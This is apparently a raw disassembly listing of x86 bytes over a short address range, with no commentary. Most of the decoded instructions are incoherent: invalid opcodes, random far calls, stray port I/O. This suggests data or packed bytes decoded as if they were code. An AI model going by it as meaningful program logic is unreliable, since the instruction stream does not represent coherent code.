  4216dc:	dec    edi
  4216dd:	ret    
  4216de:	cmp    esi,DWORD PTR [edi-0x4e]
  4216e1:	test   al,0xdc
  4216e3:	sub    edi,DWORD PTR [ebp-0x60]
  4216e6:	dec    esp
  4216e7:	in     eax,dx
  4216e8:	jbe    0x4216f5
  4216ea:	jb     0x421673
  4216ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4216ed:	enter  0x8d98,0x4e
  4216f1:	sti    
  4216f2:	bound  eax,QWORD PTR [esi-0x20668a4b]
  4216f8:	mov    eax,0x58e075d3
  4216fd:	xchg   edx,ebp
  4216ff:	push   cs
  421700:	adc    esp,DWORD PTR ds:0x4fbea761
  421706:	fadd   QWORD PTR [edx]
  421708:	add    eax,0xb2142fab
  42170d:	daa    
  42170e:	push   edi
  42170f:	mov    ah,0x14
  421711:	loope  0x421759
  421713:	mov    edx,0xce0609df
  421718:	lock inc ax
  42171b:	mov    esp,0xd476a472
  421720:	mov    dl,0xcd
  421722:	jae    0x4216e1
  421724:	push   es
  421725:	adc    al,0xdc
  421727:	mov    edi,edi
  421729:	or     ebp,DWORD PTR [edi+0x22]
  42172c:	sbb    bh,BYTE PTR [ebx+0x71]
  42172f:	xor    ebp,DWORD PTR [edx]
  421731:	mov    ds:0xb8f3cd2,al
  421736:	adc    ch,ah
  421738:	sbb    al,bh
  42173a:	xchg   esi,eax
  42173b:	cmp    BYTE PTR [eax+0x8],al
  42173e:	inc    edx
  42173f:	cmp    dh,BYTE PTR [eax+0x5abd9422]
  421745:	ins    BYTE PTR es:[edi],dx
  421746:	mov    al,ds:0x5ee8b236
  42174b:	in     eax,0xde
  42174d:	adc    al,0x8a
  42174f:	call   0x306a:0xe6180b1a
  421756:	adc    DWORD PTR [edx-0x36],0x52
  42175a:	outs   dx,BYTE PTR ds:[esi]
  42175b:	add    esi,0xb9179a0f
  421761:	sub    DWORD PTR [ecx-0x747fc4f5],edi
  421767:	mov    al,ds:0x8d96b2cf
  42176c:	or     bh,BYTE PTR [ebx-0x1d]
  42176f:	dec    BYTE PTR [edx-0x56]
  421772:	loop   0x421744
  421774:	mov    dl,0xb8
  421776:	inc    esp
  421777:	push   0xe8d0c08a
  42177c:	cmp    ecx,DWORD PTR [ebx]
  42177e:	mov    bh,BYTE PTR [edi-0x40]
  421781:	inc    ebp
  421782:	xchg   esi,eax
  421783:	inc    esp
  421784:	test   esi,0x2b22549a
  42178a:	in     eax,0x95
  42178c:	pushf  
  42178d:	ret    
  42178e:	repnz pop es
  421790:	jbe    0x421714
  421792:	aad    0xa7
  421794:	(bad)  
  421796:	push   ebp
  421797:	je     0x421736
  421799:	lea    ecx,[eax+eax*8]
  42179c:	mov    dl,0xd0
  42179e:	in     al,dx
  42179f:	cmc    
  4217a0:	scas   al,BYTE PTR es:[edi]
  4217a1:	(bad)  
  4217a2:	xchg   edi,eax
  4217a3:	nop
  4217a4:	imul   ecx,DWORD PTR [ebx],0xffffffc3
  4217a7:	outs   dx,DWORD PTR ds:[esi]
  4217a8:	cmc    
  4217a9:	xchg   esi,eax
  4217aa:	xchg   DWORD PTR [eax],esi
  4217ac:	xchg   edi,eax
  4217ad:	jne    0x421734
  4217af:	(bad)  
  4217b0:	inc    DWORD PTR [ecx]
  4217b2:	pop    edx
  4217b3:	sbb    al,0x1f
  4217b5:	jae    0x42178f
  4217b7:	sbb    ebp,DWORD PTR [eax+0xb]
  4217ba:	ja     0x42181b
  4217bc:	jmp    0x9b28:0xf343611d
  4217c3:	std    
  4217c4:	out    dx,al
  4217c5:	pshufw mm2,mm3,0x86
  4217c9:	sti    
  4217ca:	jle    0x421792
  4217cc:	jnp    0x4217d9
  4217ce:	or     DWORD PTR [eax+0x5e],esp
  4217d1:	mov    eax,0x1754710e
  4217d6:	call   0x7a31:0xe367af3f
  4217dd:	js     0x4217fd
  4217df:	aaa    
  4217e0:	jae    0x4217ed
  4217e2:	popf   
  4217e3:	(bad)  
  4217e4:	xor    bl,bl
  4217e6:	mov    bh,0xdf
  4217e8:	fst    QWORD PTR [ebp-0x6b]
  4217eb:	mov    esi,0xe7b69200
  4217f0:	daa    
  4217f1:	add    ebx,DWORD PTR [ecx-0xef43978]
  4217f7:	push   0xab43ba2c
  4217fc:	sti    
  4217fd:	shr    BYTE PTR es:[esi],cl
  421800:	mov    ecx,DWORD PTR [edx]
  421802:	out    0x60,al
  421804:	jmp    0xb14a:0x7e9190e5
  42180b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42180c:	and    DWORD PTR [ecx],ebp
  42180e:	test   DWORD PTR [ebx-0x2d],edi
  421811:	mov    cl,0x94
  421813:	cmp    cl,BYTE PTR [ebp+0x4b]
  421816:	push   ds
  421817:	mov    dl,0x1c
  421819:	mov    bl,BYTE PTR [edx+0x503cb4db]
  42181f:	and    BYTE PTR [esi-0x4e],0x52
  421823:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421824:	xor    BYTE PTR [ecx-0x7bca964c],bl
  42182a:	das    
  42182b:	pop    edi
  42182c:	xchg   eax,ebp
  42182e:	test   BYTE PTR [ebp-0x193db2fe],dh
  421834:	cs jmp 0x9846:0xb36aa4df
  42183c:	jp     0x42185b
  42183e:	inc    edx
  42183f:	test   eax,0x79a6250
  421844:	inc    edi
  421845:	adc    al,0x38
  421847:	xlat   BYTE PTR ds:[ebx]
  421848:	lds    ebp,FWORD PTR [eax+0x71ea8ba6]
  42184e:	iret   
  42184f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421850:	jmp    0xf14d881
  421855:	mov    ecx,DWORD PTR [edx-0x21734088]
  42185b:	push   ebx
  42185c:	(bad)  
  42185d:	or     ebx,edx
  42185f:	and    DWORD PTR [eax-0x768f7ac5],ecx
  421865:	xchg   edi,eax
  421866:	call   0x2b19:0x66ab9656
  42186d:	(bad)  
  42186e:	neg    eax
  421870:	xchg   edi,eax
  421871:	jns    0x4218aa
  421873:	mov    ds:0xceedf59c,al
  421878:	sub    eax,ecx
  42187a:	jmp    0xb224:0xf4b90a20
  421881:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421882:	or     dh,BYTE PTR [esi+edx*1-0x414886eb]
  421889:	or     ebp,DWORD PTR [edx]
  42188b:	je     0x4218e0
  42188d:	add    BYTE PTR [ecx],bh
  42188f:	adc    ebx,DWORD PTR [edx+eax*4+0x1f2ca69a]
  421896:	jmp    0xbb9f:0x4c91aeef
  42189d:	lahf   
  42189e:	call   0x3597:0xf339fc86
  4218a5:	out    dx,eax
  4218a6:	call   0xed70:0x5b5f4dcc
  4218ad:	pop    es
  4218ae:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4218b0:	adc    eax,0x1e49079
  4218b5:	and    BYTE PTR [edx],0xf4
  4218b8:	sbb    bl,BYTE PTR [esi+0x5a00f799]
  4218be:	cmp    dl,BYTE PTR [ecx]
  4218c0:	aam    0x84
  4218c2:	sbb    dh,BYTE PTR [ebx+ebx*4]
  4218c5:	cdq    
  4218c6:	inc    ecx
  4218c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218c8:	dec    edi
  4218c9:	push   cs
  4218ca:	lds    esp,FWORD PTR [ebx+0x67]
  4218cd:	stos   BYTE PTR es:[edi],al
  4218ce:	xchg   DWORD PTR [ebx+esi*4-0x3d],eax
  4218d2:	sub    esp,ebx
  4218d4:	inc    esi
  4218d5:	add    DWORD PTR [ebx+0x47],esi
  4218d8:	jae    0x421870
  4218da:	(bad)  
  4218dc:	and    DWORD PTR [edx],eax
  4218de:	daa    
  4218df:	ins    BYTE PTR es:[edi],dx
  4218e0:	xor    ch,BYTE PTR [ebx]
  4218e2:	sbb    bh,cl
  4218e4:	mov    eax,ds:0xd4eefafe
  4218e9:	adc    al,0xc2
  4218eb:	bswap  esi
  4218ed:	sub    eax,0xa2b57663
  4218f2:	fisubr DWORD PTR [edx+eiz*8+0x4a]
  4218f6:	into   
  4218f7:	lods   al,BYTE PTR ds:[esi]
  4218f8:	popf   
  4218f9:	or     eax,DWORD PTR [eax-0x28]
  4218fc:	into   
  4218fd:	fisubr DWORD PTR [edx]
  4218ff:	shl    DWORD PTR [eax-0xb],1
  421902:	loope  0x421927
  421904:	mov    dl,0xab
  421906:	mov    bl,0x34
  421908:	in     al,0x29
  42190a:	mov    cs,WORD PTR [eax]
  42190c:	push   edx
  42190d:	or     edi,DWORD PTR [esi+ebp*4]
  421910:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421911:	pop    esi
  421912:	mov    esi,0xed6a7256
  421917:	jb     0x4218cc
  421919:	xchg   esi,eax
  42191a:	cdq    
  42191b:	call   0x6546:0x65c415db
  421922:	repnz fdiv QWORD PTR [esi-0x3a57e78c]
  421929:	sub    al,dh
  42192b:	fst    QWORD PTR [ebx+0x20]
  42192e:	ret    
  42192f:	pop    esi
  421930:	icebp  
  421931:	retf   
  421932:	dec    BYTE PTR [ecx-0x4e]
  421935:	pushf  
  421936:	psadbw mm3,QWORD PTR [esi+0x56]
  42193a:	test   eax,0x440b84fc
  42193f:	popf   
  421940:	adc    al,0xb1
  421942:	fistp  QWORD PTR [ecx+0x288732de]
  421948:	es inc edi
  42194a:	pop    edx
  42194b:	cs ss inc esp
  42194e:	scas   eax,DWORD PTR es:[edi]
  42194f:	popa   
  421950:	or     cl,BYTE PTR [ebx]
  421952:	lds    eax,FWORD PTR [edx]
  421954:	adc    BYTE PTR [ebx+ebx*1+0x0],dh
  421958:	ja     0x4218f3
  42195a:	out    0x14,al
  42195c:	mov    ch,0x72
  42195e:	jle    0x421905
  421960:	jo     0x4219c6
  421962:	xchg   ebp,eax
  421963:	jp     0x4219b3
  421965:	mov    esi,DWORD PTR [esi+0x6]
  421968:	xor    DWORD PTR [edx],ecx
  42196a:	loope  0x4218ed
  42196c:	cwde   
  42196d:	or     edi,DWORD PTR [edi+edx*8]
  421970:	dec    eax
  421971:	inc    esi
  421972:	xor    BYTE PTR [esi-0x53],bl
  421975:	rcl    BYTE PTR [edx+ecx*1-0x1f99b667],1
  42197c:	pop    eax
  42197d:	mov    cl,BYTE PTR fs:[ecx]
  421980:	jb     0x4219e4
  421982:	lods   eax,DWORD PTR ds:[esi]
  421983:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421984:	in     al,dx
  421985:	(bad)  
  421986:	leave  
  421987:	xchg   esi,eax
  421988:	jp     0x42198b
  42198a:	mov    bl,0xe9
  42198c:	lods   eax,DWORD PTR ds:[esi]
  42198d:	jb     0x42194c
  42198f:	jnp    0x421984
  421991:	sub    edi,DWORD PTR [esi-0x3f]
  421994:	call   eax
  421996:	fimul  DWORD PTR [ecx+esi*4+0x4c]
  42199a:	push   0xdad1eca7
  42199f:	mov    ebx,0x8bede281
  4219a4:	mov    cl,0x83
  4219a6:	aam    0xb4
  4219a8:	je     0x4219b1
  4219aa:	or     ch,BYTE PTR [edi]
  4219ac:	pop    esi
  4219ad:	fs das 
  4219af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4219b0:	fwait
  4219b1:	sar    BYTE PTR [edi-0x41],cl
  4219b4:	(bad)  
  4219b5:	in     eax,dx
  4219b6:	sub    BYTE PTR [edx-0x3a8974e],dl
  4219bc:	rcl    DWORD PTR [edx],cl
  4219be:	mov    cl,0xf8
  4219c0:	bound  ecx,QWORD PTR [ebx]
  4219c2:	mov    ch,0xa
  4219c4:	mov    dh,0x7c
  4219c6:	pop    ss
  4219c7:	shl    ebx,0xd
  4219ca:	call   0xb178:0xa7691717
  4219d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4219d2:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4219d4:	ins    BYTE PTR es:[edi],dx
  4219d5:	adc    bl,al
  4219d7:	test   al,0x47
  4219d9:	push   cs
  4219da:	ins    BYTE PTR es:[edi],dx
  4219db:	addr16 mov dl,0x5b
  4219de:	xlat   BYTE PTR ds:[ebx]
  4219df:	push   ebx
  4219e0:	pop    ss
  4219e1:	mov    al,ds:0xbd2fd0c
  4219e6:	std    
  4219e7:	data16 mov WORD PTR [ebp+eax*8-0x670dd302],ss
  4219ef:	push   ds
  4219f0:	mov    DWORD PTR [edx-0x44],ebp
  4219f3:	arpl   WORD PTR [ecx-0x15],si
  4219f6:	mov    WORD PTR [esi-0x629af4e4],?
  4219fc:	scas   al,BYTE PTR es:[edi]
  4219fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4219fe:	pop    ds
  4219ff:	scas   al,BYTE PTR es:[edi]
  421a00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a01:	loopne 0x42199d
  421a03:	mov    ah,0xff
  421a05:	fwait
  421a06:	adc    dh,0x21
  421a09:	sub    esp,0x3211a7
  421a0f:	cli    
  421a10:	sub    BYTE PTR [ecx-0x2b],0xcf
  421a14:	mov    bl,0xaa
  421a16:	sub    ah,BYTE PTR [ecx+ebx*2]
  421a19:	dec    edi
  421a1a:	shl    ah,0x7e
  421a1d:	into   
  421a1e:	push   esi
  421a1f:	popf   
  421a20:	or     ch,BYTE PTR [eax-0x5bcdd366]
  421a26:	test   al,0xe7
  421a28:	sbb    BYTE PTR [edi],0x9b
  421a2b:	inc    edx
  421a2c:	pop    eax
  421a2d:	stos   BYTE PTR es:[edi],al
  421a2e:	jmp    0xb601:0x1ae2cb11
  421a35:	mov    ebx,esp
  421a37:	das    
  421a38:	mov    ecx,0xd96f9b43
  421a3d:	xor    ebp,ebx
  421a3f:	ja     0x421a2b
  421a41:	add    ebp,DWORD PTR [edx-0x53]
  421a44:	pop    ss
  421a45:	inc    ebx
  421a46:	enter  0xb123,0x69
  421a4a:	lea    esi,[esi]
  421a4c:	in     al,dx
  421a4d:	enter  0xf85b,0x14
  421a51:	jmp    0x421a14
  421a53:	loope  0x421a37
  421a55:	loop   0x421aae
  421a57:	pop    ss
  421a58:	mov    dl,0x9
  421a5a:	out    0x68,eax
  421a5c:	or     BYTE PTR [edx-0x10],0xbd
  421a60:	sbb    BYTE PTR [ebx],cl
  421a62:	lods   al,BYTE PTR ds:[esi]
  421a63:	fistp  QWORD PTR [ecx-0x3a]
  421a66:	adc    BYTE PTR [ecx+0x5f],0x64
  421a6a:	xchg   BYTE PTR [ecx-0xb],ch
  421a6d:	loopne 0x421a40
  421a6f:	out    0x73,eax
  421a71:	or     ebp,DWORD PTR ds:0xa73222cf
  421a77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a78:	sbb    BYTE PTR [edi],al
  421a7a:	adc    BYTE PTR [ebp-0x1b2ee533],dl
  421a80:	mov    dl,0xb7
  421a82:	adc    eax,0xe03151ae
  421a87:	ins    BYTE PTR es:[edi],dx
  421a88:	mov    eax,ds:0x6b15c30b
  421a8d:	das    
  421a8e:	cwde   
  421a8f:	lods   al,BYTE PTR ds:[esi]
  421a90:	add    dh,BYTE PTR [edi]
  421a92:	call   0x4e56:0x93dfe29c
  421a99:	xlat   BYTE PTR ds:[ebx]
  421a9a:	add    BYTE PTR [eax-0x7042394a],ah
  421aa0:	(bad)  
  421aa1:	sti    
  421aa2:	cmc    
  421aa3:	mov    dl,bh
  421aa5:	gs pusha 
  421aa7:	or     eax,0xb33afdbb
  421aac:	add    BYTE PTR [ebx],cl
  421aae:	fst    DWORD PTR [esi-0x4ceeaed8]
  421ab4:	cmp    dl,0x3
  421ab7:	push   esi
  421ab8:	mov    dl,0xec
  421aba:	jmp    0x421ae3
  421abc:	and    bh,BYTE PTR [esi+0x4b]
  421abf:	loopne 0x421a76
  421ac1:	icebp  
  421ac2:	xchg   edi,eax
  421ac3:	dec    esp
  421ac4:	and    edx,ebx
  421ac6:	jmp    0x16a7:0xdfc48930
  421acd:	sbb    ch,BYTE PTR [esi]
  421acf:	mov    ds:0xd773b27,eax
  421ad4:	mov    dl,0xd8
  421ad6:	pop    ds
  421ad7:	or     al,cl
  421ad9:	ins    DWORD PTR es:[edi],dx
  421ada:	jno    0x421ad5
  421adc:	call   0xb4af:0x6a4c39b
  421ae3:	sti    
  421ae4:	test   ecx,edx
  421ae6:	xor    edi,DWORD PTR [eax]
  421ae8:	or     al,0xcf
  421aea:	imul   edx,eax,0x9e7a65c9
  421af0:	scas   al,BYTE PTR es:[edi]
  421af1:	retf   0x131d
  421af4:	in     eax,dx
  421af5:	inc    ecx
  421af6:	pop    edx
  421af7:	mov    ds:0x9d0416fe,eax
  421afc:	out    0x5,eax
  421afe:	jo     0x421ad4
  421b00:	(bad)  
  421b01:	mov    ebp,0xd2a7d9fa
  421b06:	jns    0x421b14
  421b08:	ret    0x9ad4
  421b0b:	bound  ecx,QWORD PTR [ebx+0x8ac7fb4]
  421b11:	pop    esi
  421b12:	mov    BYTE PTR [esi+ecx*4-0x10b88fec],ah
  421b19:	inc    esi
  421b1a:	push   0xe
  421b1c:	iret   
  421b1d:	fstp   DWORD PTR [ebx+0x6f4896fb]
  421b23:	add    al,0x4a
  421b25:	xchg   edx,eax
  421b26:	jp     0x421b68
  421b28:	js     0x421b32
  421b2a:	jns    0x421b60
  421b2c:	jecxz  0x421b62
  421b2e:	xchg   esp,eax
  421b2f:	push   es
  421b30:	push   0x33
  421b32:	mov    fs,WORD PTR [edx+esi*4+0x20047310]
  421b39:	sub    BYTE PTR [esp+ebp*4],bl
  421b3c:	fisttp QWORD PTR [ebx]
  421b3e:	add    DWORD PTR [ebx],ecx
  421b40:	xor    eax,0x3975f779
  421b45:	or     BYTE PTR [esi-0x65427f4d],dh
  421b4b:	pop    es
  421b4c:	inc    eax
  421b4d:	into   
  421b4e:	push   edi
  421b4f:	dec    ebp
  421b50:	push   edi
  421b51:	or     al,ch
  421b53:	cmp    eax,0xa9df2ae3
  421b58:	sbb    edi,esp
  421b5a:	sub    eax,0x5222dc64
  421b5f:	pop    edx
  421b60:	adc    edx,esi
  421b62:	test   eax,eax
  421b64:	ret    0x5976
  421b67:	pop    ds
  421b68:	leave  
  421b69:	and    edi,esi
  421b6b:	pop    ds
  421b6c:	push   edi
  421b6d:	and    DWORD PTR [edi+ebx*1-0x24],edx
  421b71:	or     bl,ch
  421b73:	xchg   DWORD PTR [edi-0x16],eax
  421b76:	adc    BYTE PTR [eax+0x54677bee],bl
  421b7c:	xchg   esi,eax
  421b7d:	mov    ah,al
  421b7f:	loopne 0x421b2f
  421b81:	add    eax,0x5774394
  421b86:	daa    
  421b87:	xchg   DWORD PTR [edx+0x63963dbb],ebp
  421b8d:	or     dh,BYTE PTR [ebx+0x3a7fb4dc]
  421b93:	addr16 xchg edi,eax
  421b95:	(bad)  
  421b96:	scas   al,BYTE PTR es:[edi]
  421b97:	xchg   esp,eax
  421b98:	mov    bl,0x65
  421b9a:	jo     0x421bfd
  421b9c:	xor    edx,ebx
  421b9e:	lea    eax,es:[edx-0x2c]
  421ba2:	push   ss
  421ba3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ba4:	test   BYTE PTR ds:0x1a5302a2,dl
  421baa:	bound  ebx,QWORD PTR [edx+esi*4+0x1ded2598]
  421bb1:	push   edx
  421bb2:	xchg   DWORD PTR [ebx],esp
  421bb4:	cmp    ecx,DWORD PTR [ebx]
  421bb6:	dec    ebp
  421bb7:	shl    ch,cl
  421bb9:	ins    DWORD PTR es:[edi],dx
  421bba:	outs   dx,BYTE PTR ds:[esi]
  421bbc:	(bad)  
  421bbd:	call   0x4395:0xb925259a
  421bc4:	aaa    
  421bc5:	adc    ah,BYTE PTR [edx+0x760306ba]
  421bcb:	daa    
  421bcc:	cmp    ebp,DWORD PTR [esi-0x1e0c0868]
  421bd2:	call   0xc8:0x5ef4b540
  421bd9:	pop    eax
  421bda:	(bad)  
  421bdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421bdc:	cmp    BYTE PTR [ecx+ebp*1+0x78],0x2e
  421be1:	dec    ebx
  421be2:	loopne 0x421c3a
  421be4:	dec    esi
  421be5:	lahf   
  421be6:	call   0x54ca:0x13994fd2
  421bed:	in     eax,0x58
  421bef:	sahf   
  421bf0:	je     0x421bf6
  421bf2:	call   0xb4b:0xa2941f44
  421bf9:	pop    esp
  421bfa:	or     bh,ah
  421bfc:	mov    dl,0xc8
  421bfe:	sub    dl,BYTE PTR [edx-0x1d]
  421c01:	aaa    
  421c02:	adc    DWORD PTR [eax-0x2f],esp
  421c05:	adc    al,0xe1
  421c07:	stc    
  421c08:	mov    DWORD PTR [ebp-0x2dcc3af6],eax
  421c0e:	mov    bh,0x56
  421c10:	sahf   
  421c11:	mov    esp,DWORD PTR [esi+0x22a2849a]
  421c17:	mov    edi,0x58460bce
  421c1c:	sub    ebp,DWORD PTR [ebx-0x44c3984b]
  421c22:	call   0x1398:0x48da2814
  421c29:	pop    esi
  421c2a:	add    eax,0xebb774a7
  421c2f:	(bad)  
  421c30:	push   eax
  421c31:	jo     0x421bdc
  421c33:	das    
  421c34:	mov    dl,0xca
  421c36:	push   cs
  421c37:	sbb    eax,0x70105dc6
  421c3c:	adc    DWORD PTR [ebx],ecx
  421c3e:	out    0xde,eax
  421c40:	icebp  
  421c41:	(bad)  
  421c43:	pop    edi
  421c44:	scas   eax,DWORD PTR es:[edi]
  421c45:	add    bl,BYTE PTR [edx+0x15a9e1f8]
  421c4b:	xor    al,0x78
  421c4d:	dec    edx
  421c4e:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  421c50:	push   esi
  421c51:	call   0x2da3ec47
  421c56:	push   edi
  421c57:	xor    eax,0x7ce83346
  421c5c:	mov    dl,0x6f
  421c5e:	sar    BYTE PTR [edi-0x22567405],0x80
  421c65:	or     esp,DWORD PTR [ebp+0x3d]
  421c68:	push   eax
  421c69:	dec    esi
  421c6a:	xchg   ebx,eax
  421c6b:	add    al,BYTE PTR [edi+0x5529af1]
  421c71:	cli    
  421c72:	mov    al,0x1c
  421c74:	nop
  421c75:	out    0xb7,eax
  421c77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c78:	and    ah,ch
  421c7a:	icebp  
  421c7b:	inc    esp
  421c7c:	cs (bad) 
  421c7e:	in     eax,dx
  421c7f:	sub    BYTE PTR [esi-0x72303bbb],ch
  421c85:	jl     0x421c21
  421c87:	mov    eax,0xd5fef6e6
  421c8c:	push   esp
  421c8d:	mov    bh,0xab
  421c8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c90:	pop    ss
  421c91:	popa   
  421c92:	sub    cl,al
  421c94:	in     al,0x48
  421c96:	ins    BYTE PTR es:[edi],dx
  421c97:	ja     0x421c55
  421c99:	out    0x53,al
  421c9b:	inc    edi
  421c9c:	cmp    ebx,ebp
  421c9e:	pop    edx
  421c9f:	test   eax,0xa7e06e89
  421ca4:	xor    eax,0xfa982364
  421ca9:	loopne 0x421c8c
  421cab:	jno    0x421c5f
  421cad:	dec    esi
  421cae:	sub    BYTE PTR [ecx],dh
  421cb0:	imul   ecx,DWORD PTR [eax-0x44],0xd30b27db
  421cb7:	int3   
  421cb8:	adc    esp,esi
  421cba:	stos   BYTE PTR es:[edi],al
  421cbb:	mov    esi,0xe79a51e5
  421cc0:	mov    gs,WORD PTR [esi-0x909fbc3]
  421cc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421cc7:	pop    ecx
  421cc8:	repz or eax,DWORD PTR [eax-0x456bc4b1]
  421ccf:	(bad)  
  421cd1:	ret    
  421cd2:	call   0x8898:0xf2e48d0
  421cd9:	xchg   DWORD PTR [eax-0x59],ebp
  421cdc:	dec    ebp
  421cdd:	xor    eax,0x411aa66d
  421ce2:	aaa    
  421ce3:	push   ecx
  421ce4:	mov    eax,ds:0xb13506bb
  421ce9:	push   ds
  421cea:	shr    BYTE PTR [ebx-0x38485e5d],0xcc
  421cf1:	fild   WORD PTR [ebx]
  421cf3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421cf4:	ins    DWORD PTR es:[edi],dx
  421cf5:	mov    al,0xda
  421cf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421cf8:	fist   DWORD PTR [ebp+0x1fb230af]
  421cfe:	das    
  421cff:	dec    eax
  421d00:	mov    dh,0xba
  421d02:	push   ecx
  421d03:	nop
  421d04:	dec    ebp
  421d05:	sbb    DWORD PTR [ecx],ebx
  421d07:	cmp    dl,ah
  421d09:	or     ecx,DWORD PTR [edi+eiz*1-0x76]
  421d0d:	mov    ds:0xd4b247dd,al
  421d12:	dec    ebx
  421d13:	imul   esp,DWORD PTR [esi+0x6c],0xffffffb2
  421d17:	sahf   
  421d18:	inc    esp
  421d19:	sbb    ebx,esi
  421d1b:	test   eax,0xa735a308
  421d20:	enter  0x4591,0x29
  421d24:	dec    eax
  421d25:	cmp    DWORD PTR [ebx-0x64],edi
  421d28:	pop    esp
  421d29:	out    0xd2,eax
  421d2b:	inc    eax
  421d2c:	mov    dl,0x79
  421d2e:	push   es
  421d2f:	sbb    DWORD PTR [esi-0x7c],eax
  421d32:	enter  0xb29b,0xa9
  421d36:	mov    ch,0xf6
  421d38:	dec    esi
  421d39:	fcomp  QWORD PTR [esi]
  421d3b:	lods   eax,DWORD PTR ds:[esi]
  421d3c:	lahf   
  421d3d:	or     esi,ebx
  421d3f:	cdq    
  421d40:	scas   al,BYTE PTR es:[edi]
  421d41:	add    BYTE PTR [edi+0x5f],ch
  421d44:	lock ds call 0x89df:0xeaebce3
  421d4d:	sbb    DWORD PTR [esi-0x59],ebx
  421d50:	(bad)  
  421d52:	mov    esp,DWORD PTR [edx+ebx*4]
  421d55:	push   ebp
  421d56:	ret    0xb104
  421d59:	pop    ss
  421d5a:	inc    eax
  421d5b:	and    edi,DWORD PTR [esi+0x4b3f37e9]
  421d61:	mov    esp,0xb254507
  421d66:	xchg   ebx,eax
  421d67:	(bad)  
  421d68:	ds pop esp
  421d6a:	jb     0x421de3
  421d6c:	xor    eax,0x4cf9ac1
  421d71:	adc    bh,cl
  421d73:	inc    ecx
  421d74:	mov    ds:0x49a7a6d6,al
  421d79:	adc    DWORD PTR [edi+eax*2],edx
  421d7c:	xchg   DWORD PTR [eax+0x33b2d272],eax
  421d82:	push   ecx
  421d83:	sub    ebx,DWORD PTR [ecx]
  421d85:	mov    ebp,0x78b75f3d
  421d8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d8c:	ret    0x4047
  421d8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d90:	push   edx
  421d91:	push   edi
  421d92:	mov    BYTE PTR [eax],cl
  421d94:	mov    dl,0x7f
  421d96:	das    
  421d97:	sbb    BYTE PTR [edi-0xf],0x2a
  421d9b:	das    
  421d9c:	js     0x421dba
  421d9e:	jge    0x421ddd
  421da0:	dec    edi
  421da1:	or     cl,BYTE PTR [edi]
  421da3:	div    BYTE PTR [ebp-0xc]
  421da6:	outs   dx,DWORD PTR ds:[esi]
  421da7:	xchg   edi,eax
  421da8:	std    
  421da9:	adc    BYTE PTR [edx-0x13f7b332],bl
  421daf:	fist   WORD PTR [ebx-0x1c]
  421db2:	jecxz  0x421d5b
  421db4:	stos   DWORD PTR es:[edi],eax
  421db5:	mov    esi,0xc57db8d6
  421dba:	mov    ds:0x2b85b360,al
  421dbf:	popa   
  421dc0:	fld    DWORD PTR ss:[si+0xf76]
  421dc6:	loope  0x421d98
  421dc8:	mov    bh,0xb
  421dca:	push   ds
  421dcb:	ror    BYTE PTR [esi],1
  421dcd:	pop    esi
  421dce:	push   ecx
  421dcf:	shl    DWORD PTR [esi],cl
  421dd1:	or     BYTE PTR [ebp-0x65df5e14],0xe8
  421dd8:	push   esp
  421dd9:	adc    al,0xde
  421ddb:	push   es
  421ddc:	lock or edi,DWORD PTR [ebp+0x204e8784]
  421de3:	adc    ah,cl
  421de5:	call   0xcec25571
  421dea:	pop    edx
  421deb:	xchg   BYTE PTR [eax-0x27],bh
  421dee:	dec    ebp
  421def:	xchg   edi,eax
  421df0:	fs add eax,0x64d3bb5a
  421df6:	pop    ebx
  421df7:	das    
  421df8:	in     al,dx
  421df9:	jbe    0x421e15
  421dfb:	inc    edi
  421dfc:	mov    BYTE PTR [edx+ebx*4-0x44],0xb5
  421e01:	mov    dh,0x21
  421e03:	(bad)  
  421e04:	mov    ah,BYTE PTR es:[ebp+edx*2+0x224a15ca]
  421e0c:	imul   edx,ebp,0x8b56783d
  421e12:	(bad)  
  421e14:	shl    ebp,cl
  421e16:	jg     0x421da0
  421e18:	mov    dl,0x65
  421e1a:	loop   0x421e83
  421e1c:	jno    0x421ddd
  421e1e:	jae    0x421e7b
  421e20:	push   ebx
  421e21:	or     esp,eax
  421e23:	je     0x421dbb
  421e25:	sbb    bh,cl
  421e27:	cdq    
  421e28:	xchg   ecx,eax
  421e29:	fneni(8087 only) 
  421e2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e2c:	mov    dl,0xa3
  421e2e:	mov    ebp,0x81178159
  421e33:	xlat   BYTE PTR ds:[bx]
  421e35:	or     ebp,DWORD PTR [edx+0x3395f39a]
  421e3b:	and    al,BYTE PTR [esi]
  421e3d:	xchg   BYTE PTR [eax+0x44],ah
  421e40:	scas   al,BYTE PTR es:[edi]
  421e41:	imul   ecx,DWORD PTR [eax-0x3ad6ca8f],0x34
  421e48:	and    cl,BYTE PTR [ebx+edx*8-0x55f47f70]
  421e4f:	arpl   WORD PTR [ebx],bx
  421e51:	mov    eax,ds:0xdd5c4ea5
  421e56:	call   0x2aba:0x6b88dc04
  421e5d:	inc    eax
  421e5e:	jno    0x421e07
  421e60:	or     eax,0x286021cb
  421e65:	mov    ds:0x25b5709c,eax
